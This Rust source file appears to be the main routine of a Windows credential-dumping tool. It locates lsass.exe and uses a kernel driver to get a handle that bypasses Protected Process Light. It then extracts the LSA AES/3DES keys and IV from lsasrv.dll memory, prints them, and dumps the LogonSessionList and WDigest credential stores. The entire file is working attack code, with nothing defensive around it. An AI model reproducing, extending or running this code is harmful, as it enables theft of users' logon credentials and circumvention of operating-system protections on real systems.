use axhunter_lsa::{logon, lsa, pe, sys, wdigest};

use crate::driver::Session;
use crate::proc;

pub fn run(device: &str) -> Result<(), String> {
    let build = sys::build_number()?;
    println!("[+] OS build .............. {build}");

    let pid = proc::find_pid("lsass.exe")?;
    println!("[+] lsass.exe PID ......... {pid}");

    let driver = crate::open_driver(device)?;

    let session = Session::attach(&driver, pid)?;
    println!(
        "[+] PPL bypass handle ..... 0x{:X} ({})",
        session.handle().0 as u64,
        if session.uses_rpm() { "ReadProcessMemory" } else { "driver-side cmd 787 fallback" },
    );

    lsa::ensure_lsasrv_loaded()?;
    let lsasrv_local = lsa::local_lsasrv_base()?;
    let lsasrv_remote = proc::find_remote_module(&session, "lsasrv.dll")?;
    println!(
        "[+] lsasrv.dll ............ local 0x{:016X}  remote 0x{:016X}",
        lsasrv_local, lsasrv_remote,
    );

    let key_addrs = lsa::locate_key_addresses(build)?;
    println!(
        "[+] LSA key addrs (local) . AES 0x{:X}  3DES 0x{:X}  IV 0x{:X}",
        key_addrs.aes_va, key_addrs.des3_va, key_addrs.iv_va,
    );
    let keys = lsa::fetch_keys(&session, &key_addrs, lsasrv_local, lsasrv_remote)?;
    print!("[+] 3DES key ({:>2}B) ....... ", keys.des3_len);
    for b in &keys.des3_key { print!("{b:02x}"); }
    println!();
    print!("[+] IV .................... ");
    for b in &keys.iv { print!("{b:02x}"); }
    println!();

    println!("\n===== LogonSessionList =====");
    match logon::locate_list_head_local(build) {
        Ok(local_head) => {
            let remote_head = lsasrv_remote + (local_head - lsasrv_local);
            logon::dump(&session, remote_head, &keys, build);
        }
        Err(e) => eprintln!("[!] LogonSessionList skipped: {e}"),
    }

    println!("\n===== WDigest =====");
    match wdigest::locate_list_head_local() {
        Ok(local_head) => {
            let wdigest_local  = pe::local_base("wdigest.dll")?;
            let wdigest_remote = proc::find_remote_module(&session, "wdigest.dll")?;
            let remote_head    = wdigest::locate_list_head_remote(
                wdigest_local, wdigest_remote, local_head);
            wdigest::dump(&session, remote_head, &keys);
        }
        Err(e) => eprintln!("[!] WDigest skipped: {e}"),
    }

    println!("\n[*] Done.");
    Ok(())
}
